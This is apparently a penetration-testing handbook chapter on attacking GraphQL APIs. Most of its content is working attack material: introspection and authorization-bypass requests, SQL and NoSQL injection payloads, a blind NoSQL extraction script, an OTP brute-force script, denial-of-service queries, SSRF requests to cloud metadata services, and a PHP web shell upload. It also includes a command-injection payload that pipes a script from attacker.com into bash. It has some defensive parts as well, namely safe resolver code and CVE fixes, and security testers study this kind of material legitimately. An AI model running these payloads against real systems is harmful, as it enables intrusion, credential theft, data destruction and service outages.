# GraphQL Deep Dive

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Authentication & Authorization Bypass](#authentication--authorization-bypass)
- [Injection Attacks](#injection-attacks)
- [Batching Attacks](#batching-attacks)
- [Denial of Service](#denial-of-service)
- [SSRF via GraphQL](#ssrf-via-graphql)
- [File Upload Attacks](#file-upload-attacks)
- [Subscriptions & WebSocket Attacks](#subscriptions--websocket-attacks)
- [Tools & Automation](#tools--automation)
- [Defense Bypass Techniques](#defense-bypass-techniques)
- [Real-World Vulnerabilities (CVEs)](#real-world-vulnerabilities-cves)
- [Checklist](#checklist)
- [Related Topics](#related-topics)

---

## Reconnaissance

### Endpoint Discovery

GraphQL endpoints are often exposed under predictable paths. Here is a comprehensive list of common endpoints to test:

```bash
# Common GraphQL endpoints
/graphql
/graphql/console
/graphql/api
/graphql/graphql
/graphiql
/graphiql.php
/graphiql.js
/graphql.php
/graphql/schema.json
/v1/graphql
/v2/graphql
/api/graphql
/api/graphql/v1
/api/graphql/v2
/query
/gql
/playground
/altair
/graphql/playground
/graphql/subscriptions
/subscriptions

# Nuclei template for automated detection
nuclei -u https://target.com -t graphql-detect.yaml
```

**Real-world tip:** Many GraphQL endpoints are discovered by examining JavaScript bundles. Use browser DevTools to search for `/graphql`, `query`, `mutation`, or `ApolloClient` in source files.

### Introspection Query

Introspection is the built-in GraphQL feature that allows clients to query the schema. When enabled, it provides a complete map of all available queries, mutations, types, and fields.

```bash
# Full introspection query - use this to dump the entire schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}'

# Quick schema dump - simpler but less detailed
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Get all available queries
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# Get all available mutations
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description } } } }"}'

# Get all available subscriptions
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { subscriptionType { fields { name description } } } }"}'
```

### Tools for Discovery

Several specialized tools can automate and enhance GraphQL reconnaissance:

```bash
# GraphQL Voyager - Interactive schema visualization
# https://github.com/APIs-guru/graphql-voyager
# Run locally to visualize the schema as an interactive graph
npx graphql-voyager --endpoint https://target.com/graphql

# graphql-cop - Security auditor with extensive checks
# https://github.com/dolevf/graphql-cop
python graphql-cop.py -t https://target.com/graphql

# InQL - Burp extension & CLI from Doyensec
# https://github.com/doyensec/inql
inql -t https://target.com/graphql

# graphw00f - GraphQL server fingerprinting
# https://github.com/dolevf/graphw00f
python main.py -d -t https://target.com/graphql

# Clairvoyance - Recover schema when introspection is disabled
# https://github.com/nikitastupin/clairvoyance
python -m clairvoyance -o schema.json https://target.com/graphql
```

---

## Authentication & Authorization Bypass

### Bypass Introspection Restrictions

When introspection is disabled, you can still attempt to extract schema information through alternative methods:

```bash
# Try introspection via GET request (sometimes POST restriction only)
curl "https://target.com/graphql?query=\{__schema\{types\{name\}\}\}"

# Add X-Requested-With header to mimic AJAX request
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Use __type instead of __schema - sometimes less restricted
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'

# Field suggestions - send invalid query and check error messages
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { asdfasdf } }"}'
# Response may contain: Did you mean "id", "name", "email"?
```

**Real-world example (Parse Server - CVE-2026-32594):** The GraphQL WebSocket endpoint for subscriptions bypassed Express middleware entirely, allowing attackers to access the GraphQL schema via introspection even when public introspection was disabled, and send arbitrarily complex queries that bypassed configured complexity limits .

### Authorization Flaws

Authorization vulnerabilities in GraphQL often manifest as IDOR (Insecure Direct Object References) or field-level access control issues:

```graphql
# IDOR - Access other users' data by changing ID
query {
  user(id: "1") {
    id
    email
    password
    creditCard
  }
}

# Test with different ID values
query {
  user(id: "2") {
    id
    email
    phoneNumber
    ssn
  }
}

# Access admin-only fields (if you can guess or discover them)
query {
  user(id: "1") {
    id
    email
    isAdmin
    role
    permissions
    apiKey
    resetToken
  }
}

# Access deeply nested objects - often authorization is only checked at top level
query {
  user(id: "1") {
    orders {
      id
      total
      paymentDetails {
        cardNumber
        cvv
        expiryDate
      }
      shippingAddress {
        street
        city
        zipCode
      }
    }
  }
}

# Batch query for multiple IDs in one request
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  u4: user(id: "4") { email }
}
```

**Real-world example (Erxes - CVE-2024-57190):** An improper access control vulnerability allowed attackers to bypass authentication by manipulating the HTTP "User" header, enabling unauthorized access to any GraphQL endpoint without valid credentials. This vulnerability had a CVSS score of 9.8 (Critical) and affected all versions prior to 1.6.1 .

### Automated Authorization Testing

```bash
# GraphQL Authorization Fuzzer - Tests token scope enforcement
# https://github.com/Peterc3-dev/graphql-authz-fuzzer
# The key insight: if a read-only token gets "resource not found" instead of "scope insufficient",
# the resolver ran - meaning scope enforcement is missing at the GraphQL layer.

# Basic usage - introspect and test all mutations with a restricted token
gql-authz-fuzz https://target.com/api/graphql --token <read_only_token>

# Save schema only for later analysis
gql-authz-fuzz https://target.com/api/graphql --schema-only -o ./recon

# Resume interrupted scan
gql-authz-fuzz https://target.com/api/graphql --token <token> --resume

# GitLab-specific (with ambiguous error patterns)
gql-authz-fuzz https://gitlab.com/api/graphql \
  --token glpat-xxxxx \
  --id-format "gid://gitlab/{model}/999999999" \
  --ambiguous "the resource that you are attempting to access does not exist or you don't have permission"
```

The tool classifies responses into categories that indicate whether the mutation resolver was reached:
- `SCOPE_BLOCKED` - Token scope was explicitly rejected (good enforcement)
- `SUCCESS` - Mutation executed with restricted token (critical finding - scope not enforced)
- `RESOLVER_DENIED` - Auth passed but resolver denied (scope missing but role/ownership enforced)

**Real-world example:** This technique discovered CVE-2025-11340, where GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer .

---

## Injection Attacks

GraphQL injection attacks occur when resolvers unsafely embed user-supplied arguments into database queries. The root cause is always the same: untrusted data is treated as executable code rather than as data .

### SQL Injection

GraphQL's type system only validates data format (e.g., String), not content. A legitimate-looking string can contain malicious SQL .

```graphql
# Basic SQLi in arguments - test for boolean-based injection
query {
  user(name: "admin' OR '1'='1") {
    id
    email
    password
  }
}

# Union-based injection to extract data from other tables
query {
  user(name: "' UNION SELECT username, password, NULL FROM admin_users--") {
    id
    email
  }
}

# In filter arguments (common in search functionality)
query {
  users(filter: { name_contains: "' OR 1=1--" }) {
    id
    name
    email
  }
}

# In order by clause - often directly concatenated into ORDER BY
query {
  users(orderBy: "name; DROP TABLE users--") {
    id
    name
  }
}

# Time-based blind injection
query {
  user(id: "1' AND (SELECT pg_sleep(5))--") {
    id
  }
}
```

**Vulnerable resolver example (Node.js):**
```javascript
const resolvers = {
  Query: {
    user: async (_, { id }) => {
      // DANGER: Direct string concatenation
      const query = `SELECT * FROM users WHERE id = '${id}'`;
      return db.query(query);
    }
  }
};
```

**Safe resolver using parameterized queries:**
```javascript
const resolvers = {
  Query: {
    user: async (_, { id }) => {
      const query = 'SELECT * FROM users WHERE id = ?';
      return db.query(query, [id]);
    }
  }
};
```

### NoSQL Injection

NoSQL injection is particularly dangerous when MongoDB's `$where` operator is used, as it executes arbitrary JavaScript .

```graphql
# Basic MongoDB injection with $gt operator
query {
  user(name: "{\"$gt\": \"\"}") {
    id
    email
    password
  }
}

# Regex injection to extract all data
query {
  users(filter: { name_regex: ".*" }) {
    id
    email
    password
  }
}

# JavaScript execution via $where (extremely dangerous)
query {
  usersNoSQL(filter: "true") {
    id
    username
  }
}

# Extract specific user data
query {
  usersNoSQL(filter: "this.username == 'admin'") {
    id
    username
    password
  }
}

# Process termination - if MongoDB has server-side JS enabled
query {
  usersNoSQL(filter: "function(){ return process.exit(1); }()") {
    id
  }
}
```

**Vulnerable resolver example:**
```javascript
const resolvers = {
  Query: {
    usersNoSQL: async (_, { filter }) => {
      // DANGER: Direct injection into $where
      const query = { $where: `function() { return ${filter}; }` };
      return await collection.find(query).toArray();
    }
  }
};
```

**Real-world exploitation script for blind NoSQL injection:**
```python
#!/usr/bin/env python3
import requests
import json
import string

def blind_noql_injection(url, field, target_value):
    """Extract data character by character using blind NoSQL injection"""
    extracted = ""
    charset = string.ascii_lowercase + string.digits + "_{}"
    
    for position in range(1, 50):
        for char in charset:
            # Injects JavaScript condition that returns true only when character matches
            payload = f"this.{field}[{position-1}] == '{char}'"
            query = {
                "query": f"""
                query {{
                  usersNoSQL(filter: "{payload}") {{
                    id
                    username
                  }}
                }}
                """
            }
            response = requests.post(url, json=query)
            if len(response.json().get('data', {}).get('usersNoSQL', [])) > 0:
                extracted += char
                print(f"[+] Found: {extracted}")
                break
    return extracted
```

### OS Command Injection

```graphql
# If backend executes shell commands (e.g., generating reports, exporting data)
mutation {
  exportData(format: "csv; cat /etc/passwd") {
    url
  }
}

mutation {
  generateReport(type: "pdf`whoami`") {
    status
    output
  }
}

mutation {
  convertImage(format: "png; curl http://attacker.com/shell.sh | bash") {
    url
  }
}
```

---

## Batching Attacks

Batching is a GraphQL feature that allows multiple operations to be sent in a single HTTP request. Attackers exploit this to bypass rate limiting, brute-force credentials, or enumerate OTPs .

### Query Batching for Brute Force

```bash
# Array-based batching - each element is a separate operation
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password1\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password2\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password3\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password4\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password5\") { token } }"}
  ]'

# Alias-based batching - single query with multiple aliased mutations
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { 
    a1: login(email:\"admin@example.com\", password:\"password1\") { token }
    a2: login(email:\"admin@example.com\", password:\"password2\") { token }
    a3: login(email:\"admin@example.com\", password:\"password3\") { token }
    a4: login(email:\"admin@example.com\", password:\"password4\") { token }
    a5: login(email:\"admin@example.com\", password:\"password5\") { token }
  }"}'
```

### OTP/2FA Bypass via Batching

Two-factor authentication codes are typically 6 digits (1,000,000 possibilities). With batching, an attacker can test all codes in a single request .

```graphql
# Brute force OTP in single request using aliases
mutation {
  v0: verifyOTP(email: "victim@example.com", code: "000000") { success token }
  v1: verifyOTP(email: "victim@example.com", code: "000001") { success token }
  v2: verifyOTP(email: "victim@example.com", code: "000002") { success token }
  v3: verifyOTP(email: "victim@example.com", code: "000003") { success token }
  # ... continue to 999999
}
```

**Real-world exploitation script (Node.js):**
```javascript
// From Hack The Box - SpeedNet challenge
const axios = require('axios');

const ENDPOINT = 'https://target.com/graphql';
const BATCH_SIZE = 200;
const DELAY_MS = 1000;

async function bruteForceOTP() {
    for (let start = 0; start <= 999999; start += BATCH_SIZE) {
        let batch = [];
        for (let i = 0; i < BATCH_SIZE && start + i <= 999999; i++) {
            const otp = String(start + i).padStart(6, '0');
            batch.push({
                query: `mutation { attempt${i}: verifyOTP(code: "${otp}") { success token } }`
            });
        }
        
        console.log(`Trying OTP range: ${start} - ${start + BATCH_SIZE}`);
        const response = await axios.post(ENDPOINT, batch);
        
        // Check each response for success
        for (const key in response.data.data) {
            if (response.data.data[key].success) {
                console.log(`OTP FOUND: ${key.replace('attempt', '')}`);
                return;
            }
        }
        
        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
    }
}

bruteForceOTP();
```

---

## Denial of Service

### Recursive Query (Circular References)

When the schema contains circular relationships (e.g., User has friends that are also Users), deeply nested queries can cause exponential resource consumption.

```graphql
# Recursive friend query - each level multiplies the number of database queries
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                        email
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Field Duplication

**Real-world example (Directus - CVE-2024-39895):** A denial of service vulnerability existed where an attacker could duplicate fields many times in a single GraphQL query, causing the server to perform redundant computations and consume excessive resources. Request to the `/graphql` endpoint were sent when visualizing graphs generated at a dashboard. By modifying the data sent and duplicating many times the fields, a DoS attack was possible. This was fixed in version 10.12.0 .

```graphql
# Field duplication attack - requesting the same field hundreds of times
query {
  users {
    name name name name name name name name name name
    name name name name name name name name name name
    name name name name name name name name name name
    email email email email email email email email email email
    email email email email email email email email email email
    email email email email email email email email email email
    id id id id id id id id id id
    id id id id id id id id id id
  }
}
```

### Batch Query DoS

```bash
# Send thousands of queries in a single array
python3 -c "import json; print(json.dumps([{'query':'{ users { name } }'}]*10000))" | \
  curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d @-
```

### Directive Overloading

```graphql
# Excessive directives can cause parsing overhead
query {
  users @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false) {
    name @include(if: true) @include(if: true) @include(if: true) {
      firstName
      lastName
    }
  }
}
```

### Query Depth Attack

```graphql
# Extremely deep nesting without circular references
query {
  level1 {
    level2 {
      level3 {
        level4 {
          level5 {
            level6 {
              level7 {
                level8 {
                  level9 {
                    level10 {
                      value
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## SSRF via GraphQL

Server-Side Request Forgery occurs when a GraphQL mutation or query fetches a URL provided by the user without proper validation.

```graphql
# If there's a URL import or webhook field
mutation {
  importUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin") {
    content
    status
  }
}

# AWS metadata service
mutation {
  fetchResource(url: "http://169.254.169.254/latest/user-data") {
    data
  }
}

# File protocol for local file disclosure
mutation {
  importUrl(url: "file:///etc/passwd") {
    content
  }
}

# Internal service discovery
mutation {
  webhook(url: "http://localhost:8080/admin/users") {
    status
    response
  }
}

# GCP metadata
mutation {
  fetchUrl(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") {
    response
  }
}

# Kubernetes etcd
mutation {
  getUrl(url: "http://127.0.0.1:2379/v2/keys/?recursive=true") {
    data
  }
}
```

**Real-world example (Craft CMS - CVE-2025-68437):** A Server-Side Request Forgery vulnerability existed in the GraphQL asset upload mutation via the `_file` URL parameter. Attackers could exploit this to make requests to internal services. The vulnerability was fixed in versions 5.8.21 and 4.16.17 .

---

## File Upload Attacks

GraphQL file uploads typically use the GraphQL multipart request specification. This can be abused for path traversal, SSRF, or uploading malicious files.

```bash
# Standard GraphQL multipart request
curl -X POST https://target.com/graphql \
  -H "Content-Type: multipart/form-data" \
  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url path } }","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=@malicious.php'

# Path traversal in filename
curl -X POST https://target.com/graphql \
  -H "Content-Type: multipart/form-data" \
  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=@shell.php;filename=../../../var/www/html/shell.php'

# Double extension bypass
-F '0=@shell.php;filename=shell.php.jpg'

# Null byte injection (older systems)
-F '0=@shell.php;filename=shell.php%00.jpg'

# Upload web shell to writable directory
curl -X POST https://target.com/graphql \
  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=<?php system($_GET["cmd"]); ?>;filename=shell.php'
```

---

## Subscriptions & WebSocket Attacks

GraphQL subscriptions use WebSockets for real-time communication. These endpoints often have different security controls than the main GraphQL endpoint.

```javascript
// Connect to subscription WebSocket endpoint
const WebSocket = require('ws');

const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');

ws.on('open', () => {
  // Initialize connection (some servers require authentication here)
  ws.send(JSON.stringify({
    type: 'connection_init',
    payload: {
      headers: {
        'Authorization': 'Bearer '  // Try empty or forged token
      }
    }
  }));

  // Subscribe to sensitive events
  ws.send(JSON.stringify({
    id: '1',
    type: 'start',
    payload: {
      query: `
        subscription {
          onUserCreated {
            id
            email
            password
            resetToken
          }
        }
      `
    }
  }));

  // Try to subscribe to admin events
  ws.send(JSON.stringify({
    id: '2',
    type: 'start',
    payload: {
      query: `
        subscription {
          onPasswordReset {
            userId
            resetLink
            newPassword
          }
        }
      `
    }
  }));
});

ws.on('message', (data) => {
  console.log('Received:', JSON.parse(data));
});
```

**Real-world example (Parse Server - CVE-2026-32594):** The GraphQL WebSocket endpoint for subscriptions did not pass requests through the Express middleware chain that enforces authentication, introspection control, and query complexity limits. An attacker could connect to the WebSocket endpoint and execute GraphQL operations without providing a valid application or API key, access the GraphQL schema via introspection even when public introspection was disabled, and send arbitrarily complex queries that bypass configured complexity limits .

---

## Tools & Automation

### GraphQL-specific Tools

```bash
# BatchQL - Batched query security testing
# https://github.com/assetnote/batchql
python batchql.py -e https://target.com/graphql
python batchql.py -e https://target.com/graphql -s schema.json -m query

# CrackQL - Brute force via batching
# https://github.com/nicholasaleks/CrackQL
python CrackQL.py -t https://target.com/graphql \
  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
  -i usernames.txt -p passwords.txt

# graphql-path-enum - Find paths to sensitive types
# https://gitlab.com/dee-see/graphql-path-enum
graphql-path-enum -i schema.json -t PrivateData
graphql-path-enum -i schema.json -t CreditCard -t SSN -t Password

# GraphQL Cop - Security auditor
python graphql-cop.py -t https://target.com/graphql --report html

# graphql-crawler - Discover all queries and mutations
npx graphql-crawler https://target.com/graphql --output schema.json
```

### Burp Suite Integration

```bash
# InQL Scanner extension
# 1. Install from BApp Store
# 2. Send GraphQL request to InQL Scanner
# 3. Analyze schema and generate queries for all types
# 4. Test mutations with automatically generated arguments
# 5. Test subscriptions by generating WebSocket connections

# GraphQL Raider extension
# Features:
# - Automatic introspection query execution
# - Query template generation
# - Batching attack automation
# - Custom GraphQL request builder

# TabQL extension
# - GraphQL-specific tab for Burp
# - Schema visualization
# - Request/response beautification
```

### Python Automation Script

```python
#!/usr/bin/env python3
"""
GraphQL Security Testing Automation
Combines introspection, query generation, and vulnerability testing
"""

import requests
import json
import time
import string
import random
from typing import Dict, List, Any

class GraphQLSecurityTester:
    def __init__(self, endpoint: str, headers: Dict = None):
        self.endpoint = endpoint
        self.headers = headers or {'Content-Type': 'application/json'}
        self.schema = None
    
    def introspect(self) -> Dict:
        """Perform full schema introspection"""
        query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    kind
                    description
                    fields(includeDeprecated: true) {
                        name
                        description
                        args { name type { name kind } }
                        type { name kind }
                    }
                    inputFields { name type { name } }
                    enumValues { name }
                }
            }
        }
        """
        response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
        self.schema = response.json()
        return self.schema
    
    def test_introspection_blocked(self) -> bool:
        """Test if introspection is properly disabled"""
        query = "{ __schema { types { name } } }"
        response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
        
        # If introspection is disabled, typically returns error or null data
        if 'errors' in response.json():
            return True  # Likely blocked
        data = response.json().get('data', {})
        if data.get('__schema') is None:
            return True  # Blocked
        return False  # Introspection is enabled!
    
    def generate_idor_tests(self) -> List[str]:
        """Generate queries for IDOR testing"""
        if not self.schema:
            self.introspect()
        
        idor_queries = []
        
        # Look for queries that take ID arguments
        query_type = self.schema.get('data', {}).get('__schema', {}).get('queryType', {})
        if query_type:
            for field in query_type.get('fields', []):
                for arg in field.get('args', []):
                    if 'id' in arg.get('name', '').lower() or arg.get('type', {}).get('name') == 'ID':
                        idor_queries.append(f"""
                        query {{
                          {field['name']}({arg['name']}: "1") {{
                            __typename
                            ... on Node {{ id }}
                          }}
                        }}
                        """)
        
        return idor_queries
    
    def test_batching_limit(self, num_operations: int = 100) -> Dict:
        """Test if batching is limited"""
        batch = []
        for i in range(num_operations):
            batch.append({'query': '{ __typename }'})
        
        response = requests.post(self.endpoint, json=batch, headers=self.headers)
        return {
            'status_code': response.status_code,
            'response_size': len(response.content),
            'successful': response.status_code == 200
        }
    
    def test_depth_limit(self) -> Dict:
        """Test if query depth limiting is implemented"""
        depth_results = {}
        
        for depth in [5, 10, 20, 50, 100]:
            # Build nested query
            nested = '{ value }'
            for _ in range(depth - 1):
                nested = f'{{ child {nested} }}'
            query = f'{{ node {nested} }}'
            
            start_time = time.time()
            response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
            elapsed = time.time() - start_time
            
            depth_results[depth] = {
                'status_code': response.status_code,
                'response_time': elapsed,
                'error': 'errors' in response.json()
            }
            
            if elapsed > 10:  # Timeout threshold
                depth_results[depth]['timeout'] = True
                break
        
        return depth_results
    
    def run_full_assessment(self) -> Dict:
        """Run complete security assessment"""
        results = {
            'endpoint': self.endpoint,
            'introspection_enabled': not self.test_introspection_blocked(),
            'batching_test': self.test_batching_limit(50),
            'depth_test': self.test_depth_limit(),
            'recommendations': []
        }
        
        if results['introspection_enabled']:
            results['recommendations'].append('Disable introspection in production')
        
        if results['batching_test']['status_code'] == 200:
            results['recommendations'].append('Implement batching limits')
        
        return results

# Usage
if __name__ == '__main__':
    tester = GraphQLSecurityTester('https://target.com/graphql')
    results = tester.run_full_assessment()
    print(json.dumps(results, indent=2))
```

---

## Defense Bypass Techniques

### Rate Limiting Bypass

Rate limiting typically applies per HTTP request. Batching allows multiple operations in one request, bypassing this .

```graphql
# Alias-based batching bypasses per-query rate limits
# Instead of 100 separate requests, send 100 mutations in one request
mutation {
  q1: resetPassword(email: "victim@example.com")
  q2: resetPassword(email: "victim@example.com")
  q3: resetPassword(email: "victim@example.com")
  q4: resetPassword(email: "victim@example.com")
  # ... 96 more
}

# Different operation names also help bypass
mutation op1 { resetPassword(email: "victim@example.com") }
mutation op2 { resetPassword(email: "victim@example.com") }
mutation op3 { resetPassword(email: "victim@example.com") }
```

### WAF Bypass

```bash
# Change Content-Type to avoid detection
Content-Type: application/graphql
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded

# Use GET with query parameter (some WAFs only inspect POST)
GET /graphql?query={users{name}} HTTP/1.1

# URL encode the query
GET /graphql?query=%7Busers%7Bname%7D%7D HTTP/1.1

# Double URL encode
GET /graphql?query=%257Busers%257Bname%257D%257D HTTP/1.1

# Add benign-looking parameters
GET /graphql?query={users{name}}&utm_source=google&utm_campaign=test

# Add spaces and newlines to break WAF signatures
{"query":"{\n  users\n  {\n    name\n  }\n}"}

# Use line comments
{"query":"{\n  # This is a comment\n  users\n  {\n    name\n  }\n}"}

# Use fragments to obfuscate
query { 
  ...UserFields 
}
fragment UserFields on Query {
  users { 
    name 
  }
}

# Aliases to hide field names
query {
  a: users {
    b: name
    c: email
  }
}
```

### Introspection Blocking Bypass

```bash
# Use __type instead of __schema
curl -X POST https://target.com/graphql \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'

# Use GraphQL Voyager with introspection bypass
# Some implementations allow introspection if a specific header is present
curl -X POST https://target.com/graphql \
  -H "X-Introspection: enabled" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Try different HTTP methods
curl -X GET "https://target.com/graphql?query={__schema{types{name}}}"
curl -X OPTIONS https://target.com/graphql
curl -X HEAD https://target.com/graphql?query={__schema{types{name}}}
```

---

## Real-World Vulnerabilities (CVEs)

### CVE-2024-57190 - Erxes Authentication Bypass (CVSS 9.8 Critical)
**Affected versions:** Erxes < 1.6.1
**Description:** Improper access control allowed attackers to bypass authentication by manipulating the HTTP "User" header, enabling unauthorized access to any GraphQL endpoint without valid credentials.
**Impact:** Unauthenticated attackers could completely compromise the application, access any GraphQL endpoint, view/modify/delete sensitive data, and perform administrative actions.
**Fix:** Upgrade to Erxes version 1.6.1 or later, implement strict input validation for HTTP headers, audit all GraphQL endpoint access controls .

### CVE-2024-39895 - Directus DoS via Field Duplication
**Affected versions:** Directus < 10.12.0
**Description:** A denial of service attack by field duplication in GraphQL where an attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query. This causes the server to perform redundant computations and consume excessive resources.
**Attack vector:** Requests to the `/graphql` endpoint made when visualizing graphs generated at a dashboard.
**Fix:** Upgrade to Directus 10.12.0 or later .

### CVE-2025-68437 - Craft CMS SSRF via GraphQL Asset Upload
**Affected versions:** Craft CMS < 5.8.21, < 4.16.17
**Description:** Server-Side Request Forgery vulnerability in the GraphQL asset upload mutation via the `_file` URL parameter.
**Impact:** Attackers could make requests to internal services, potentially accessing cloud metadata endpoints or internal APIs.
**Fix:** Upgrade to Craft CMS 5.8.21 or 4.16.17 .

### CVE-2026-32594 - Parse Server WebSocket Bypass
**Affected versions:** Parse Server using GraphQL API
**Description:** The GraphQL WebSocket endpoint for subscriptions does not pass requests through the Express middleware chain that enforces authentication, introspection control, and query complexity limits.
**Impact:** Attackers can connect to the WebSocket endpoint and execute GraphQL operations without providing a valid application or API key, access the GraphQL schema via introspection even when public introspection is disabled, and send arbitrarily complex queries that bypass configured complexity limits.
**Workaround:** Block WebSocket upgrade requests to the GraphQL subscriptions path (by default `/subscriptions`) at the network level using a reverse proxy or load balancer rule .

### CVE-2025-11340 - GitLab Scope Enforcement Bypass
**Description:** GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer.
**Detection method:** Using a restricted token (read_api) to attempt write mutations; if the response is "resource not found" instead of "scope insufficient", the resolver ran - indicating missing scope enforcement.
**Fix:** Implement proper scope checking at the GraphQL resolver layer .

---

## Checklist

```markdown
## Reconnaissance
- [ ] Find GraphQL endpoint (common paths, JS bundle search)
- [ ] Test introspection (POST, GET, __type fallback)
- [ ] Fingerprint GraphQL implementation (graphw00f)
- [ ] Map complete schema (queries, mutations, subscriptions, types)
- [ ] Identify sensitive fields (password, token, creditCard, ssn, apiKey)
- [ ] Save schema for offline analysis

## Authentication/Authorization Testing
- [ ] Test IDOR on object access (change IDs, use aliases for batch)
- [ ] Test field-level authorization (access nested fields of other users)
- [ ] Test mutation authorization (privilege escalation via mutations)
- [ ] Check for sensitive data exposure in error messages
- [ ] Test token scope enforcement (read-only token on write mutations)
- [ ] Test HTTP header manipulation for auth bypass (User header, etc.)

## Injection Attacks
- [ ] SQL injection in string arguments
- [ ] SQL injection in filter/where arguments
- [ ] NoSQL injection ($gt, $regex, $where)
- [ ] Command injection in fields that execute system commands
- [ ] SSRF via URL import/webhook fields
- [ ] XXE in file uploads

## Denial of Service Testing
- [ ] Test circular queries (friends of friends pattern)
- [ ] Test field duplication (same field repeated many times)
- [ ] Test batch query limits (send array of hundreds of queries)
- [ ] Test query depth limits (deeply nested queries)
- [ ] Test alias limits (hundreds of aliases in one query)

## Batching Attack Testing
- [ ] Batching for credential brute force
- [ ] Batching for OTP/2FA enumeration
- [ ] Batching to bypass rate limiting
- [ ] Batching for user ID enumeration

## WebSocket/Subscriptions Testing
- [ ] Test subscription authentication requirements
- [ ] Test introspection via WebSocket endpoint
- [ ] Test if WebSocket bypasses middleware security
- [ ] Subscribe to sensitive events (user creation, password reset)

## File Upload Testing
- [ ] Path traversal in filename
- [ ] Web shell upload to writable directories
- [ ] SSRF via URL-based uploads
- [ ] MIME type bypass
- [ ] Double extension bypass

## Post-Exploitation
- [ ] Extract data from all accessible queries
- [ ] Chain vulnerabilities (IDOR + injection)
- [ ] Escalate privileges via mutations
- [ ] Access admin-only mutations
```

---

## Related Topics

- [API Security](https://www.pentest-book.com/enumeration/web/api-security) - REST/gRPC testing methodologies
- [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - Server-side request forgery deep dive
- [SQL Injection](https://www.pentest-book.com/enumeration/web/sqli) - Traditional database attacks
- [JWT Attacks](https://www.pentest-book.com/enumeration/web/jwt) - Token-based authentication
- [WebSocket Security](https://www.pentest-book.com/enumeration/web/websockets) - Real-time communication attacks
